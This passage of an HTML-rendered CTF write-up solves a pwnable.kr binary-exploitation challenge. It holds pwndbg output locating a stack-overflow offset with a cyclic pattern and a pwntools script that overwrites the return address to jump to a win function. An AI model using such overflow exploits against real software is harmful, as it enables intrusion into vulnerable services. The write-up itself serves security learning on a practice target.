+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>[ DISASM <span style="color:#f92672">/</span> x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span> <span style="color:#f92672">/</span> set emulate on ]<span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x40064c</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>     mov    byte ptr [rax], dl            <span style="color:#f92672">&lt;</span>Cannot dereference [<span style="color:#ae81ff">0x7ffffffff000</span>]<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40064e</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>     add    dword ptr [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x400652</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>     cmp    dword ptr [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1c</span>], <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x400656</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>     setne  al
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x400659</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">85</span><span style="color:#f92672">&gt;</span>     sub    dword ptr [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1c</span>], <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40065d</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;</span>     test   al, al
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40065f</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">91</span><span style="color:#f92672">&gt;</span>     jne    my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>                 <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x400661</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">93</span><span style="color:#f92672">&gt;</span>     jmp    my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">96</span>                 <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">96</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x400664</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">96</span><span style="color:#f92672">&gt;</span>     mov    eax, dword ptr [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x400667</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">99</span><span style="color:#f92672">&gt;</span>     leave  
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x400668</span> <span style="color:#f92672">&lt;</span>my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;</span>    ret    
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>[ STACK ]<span style="color:#960050;background-color:#1e0010">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span> rsp   <span style="color:#ae81ff">0x7fffffffe810</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xfffff84e00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>:<span style="color:#ae81ff">0008</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">-</span><span style="color:#ae81ff">018</span>   <span style="color:#ae81ff">0x7fffffffe818</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7fffffffe850</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x62617a6f6261796f</span> (<span style="color:#e6db74">&#39;oyabozab&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span>:<span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">-</span><span style="color:#ae81ff">010</span>   <span style="color:#ae81ff">0x7fffffffe820</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span>:<span style="color:#ae81ff">0018</span><span style="color:#960050;background-color:#1e0010">│</span> rsi<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0x7fffffffe828</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x7b061ffe2f0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>:<span style="color:#ae81ff">0020</span><span style="color:#960050;background-color:#1e0010">│</span> rbp   <span style="color:#ae81ff">0x7fffffffe830</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7fffffffe880</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x62616d7062616c70</span> (<span style="color:#e6db74">&#39;plabpmab&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">0028</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">008</span>   <span style="color:#ae81ff">0x7fffffffe838</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x4006bd</span> (main<span style="color:#f92672">+</span><span style="color:#ae81ff">84</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> mov eax, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">0030</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">010</span>   <span style="color:#ae81ff">0x7fffffffe840</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7fffffffe9a8</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x62616c7362616b73</span> (<span style="color:#e6db74">&#39;skabslab&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span>:<span style="color:#ae81ff">0038</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">018</span>   <span style="color:#ae81ff">0x7fffffffe848</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x100000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>[ BACKTRACE ]<span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0x40064c</span> my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">0x4006bd</span> main<span style="color:#f92672">+</span><span style="color:#ae81ff">84</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0x62616f7062616e70</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0x6261717062617070</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">0x6261737062617270</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">0x6261757062617470</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">0x6261777062617670</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">0x6261797062617870</span> None
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> cyclic <span style="color:#f92672">-</span>n <span style="color:#ae81ff">4</span> <span style="color:#f92672">-</span>l plab
+</span></span><span style="display:flex;"><span>Finding cyclic pattern of <span style="color:#ae81ff">4</span> bytes: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;plab&#39;</span> (hex: <span style="color:#ae81ff">0x706c6162</span>)
+</span></span><span style="display:flex;"><span>Found at offset <span style="color:#ae81ff">4141</span>
+</span></span></code></pre></div><p>Alright, so, if its at offset <code>4141</code> when in <code>$rbp</code>, we need +8 more to hit <code>$rsp</code>, leaving us with the offset <code>4149</code>, which by all accounts
+makes sense considering the instal buffer size was 44 bytes</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pipedbuffer(4096) + input_size(44) +offbyone + 8_bytes_to_reach_rbp = 4149
+</span></span></code></pre></div><p>So the math checks out, cool.</p>
+<h1 id="solution">Solution:</h1>
+<p>Here&rsquo;s the solution.
+I also added a cute little ropgadget to make sure it exits properly without crashing.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4006c3</span>
+</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005f4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-1 &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4149</span> <span style="color:#f92672">+</span> p64(ret) <span style="color:#f92672">+</span> p64(win) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#ae81ff">9015</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;payload please : &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Enjoy the !pwn!</p>
+
+        </div>
+
+        <footer class="post-footer">
+            
+            <div class="ctf-nav">
+                <a href="http://localhost:1313/ctf/pwnable.kr/" class="back-to-ctf">
+                    ← Back to Pwnable.kr
+                </a>
+            </div>
+            
+        </footer>
+    </article>
+</div>
+
+        </main>
+
+        <footer class="site-footer">
+    <div class="footer-content">
+        <div class="footer-section">
+            <h3>gracecondition</h3>
+            <p>OS internals, binary exploitation, and low-level security research</p>
+        </div>
+
+        <div class="footer-section">
+            <h4>Quick Links</h4>
+            <ul>
+                <li><a href="/posts/">Posts</a></li>
+                <li><a href="/articles/">Articles</a></li>
+                <li><a href="/ctf/">CTF Solutions</a></li>
+                <li><a href="/about/">About</a></li>
+            </ul>
+        </div>
+
+        <div class="footer-section">
+            <h4>Connect</h4>
+            <div class="social-links">
+                
+                
+                
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-bottom">
+        <p>&copy; 2025 gracecondition. All rights reserved.</p>
+    </div>
+</footer>
+    </div>
+
+    <script type="module">
+        import { WaveGradient } from 'https://unpkg.com/wave-gradient@0.1.0/dist/wave-gradient.js';
+
+        const canvas = document.getElementById('wave-gradient-canvas');
+        if (canvas) {
+            const gradient = new WaveGradient(canvas, {
+                colors: ['#000000', '#0a0a0a', '#151515', '#202020', '#2a2a2a', '#353535'],
+                fps: 30,
+                seed: 42,
+                speed: 1.0,
+                amplitude: 320,
+            });
+        }
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+    <script>
+        
+        const isMobile = window.innerWidth <= 768;
+
+        mermaid.initialize({
+            startOnLoad: true,
+            theme: 'dark',
+            themeVariables: {
+                darkMode: true,
+                background: '#0a0a0a',
+                primaryColor: '#1a1a1a',
+                primaryTextColor: '#e0e0e0',
+                primaryBorderColor: '#2a2a2a',
+                lineColor: '#4a4a4a',
+                secondaryColor: '#2a2a2a',
+                tertiaryColor: '#1a1a1a',
+                fontSize: '14px',
+                fontFamily: 'SF Pro Text, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif'
+            },
+            flowchart: {
+                useMaxWidth: true,
+                htmlLabels: true,
+                curve: 'basis'
+            },
+            sequence: {
+                useMaxWidth: true
+            },
+            gantt: {
+                useMaxWidth: true
+            }
+        });
+    </script>
+    <script src="http://localhost:1313/js/main.js"></script>
+    
+</body>
+</html>
